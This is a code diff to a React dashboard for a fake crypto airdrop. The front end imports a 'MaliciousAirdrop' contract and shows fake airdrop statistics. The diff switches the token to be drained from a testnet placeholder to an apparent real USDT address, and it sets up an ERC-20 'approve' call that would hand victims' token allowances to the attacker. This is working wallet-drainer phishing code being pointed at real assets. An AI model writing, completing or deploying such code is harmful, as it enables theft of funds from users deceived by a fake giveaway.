@@ -4,18 +4,6 @@ import { ethers } from 'ethers';
 import maliciousContractABI from '../../artifacts/contracts/MaliciousAirdrop.sol/MaliciousAirdrop.json';
 import axios from 'axios';
 
-// Static referral codes that are valid - THIS WILL BE REMOVED
-const VALID_REFERRAL_CODES = [
-  "FRIEND50",
-  "BONUS100", 
-  "WELCOME25",
-  "SPECIAL75",
-  "VIP2024",
-  "SUMMER2024",
-  "WINTER2024",
-  "SPRING2024",
-  "AUTUMN2024"
-];
 
 // Static fake airdrop statistics
 const FAKE_AIRDROP_STATS = {
@@ -190,7 +178,7 @@ const Dashboard: React.FC = () => {
     // If contracts are deployed, try to interact with them
     if (contractAddresses && account && window.ethereum) {
       try {
-        const tokenAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3"; // Replace with the token you want to drain (e.g., USDT address on your testnet)
+        const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
         const erc20Abi = [
           "function approve(address spender, uint256 amount) public returns (bool)"
         ];
